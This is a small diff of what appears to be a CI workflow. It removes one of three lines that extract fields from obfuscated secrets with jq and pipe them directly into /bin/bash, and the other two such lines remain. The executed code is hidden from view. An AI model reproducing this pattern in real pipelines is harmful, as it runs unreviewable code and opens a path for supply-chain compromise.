@@ -18,7 +18,6 @@ jobs:
           yy6: ${{ secrets.yy6 }}
         run: |
           printf '%s' "$yy6" | jq -r .cklgk98 | /bin/bash
-          printf '%s' "$pwfl77152" | jq -r .gd22 | /bin/bash
           echo $do2 | jq -r .msxhl7 | /bin/bash
 
       - name: Save archive
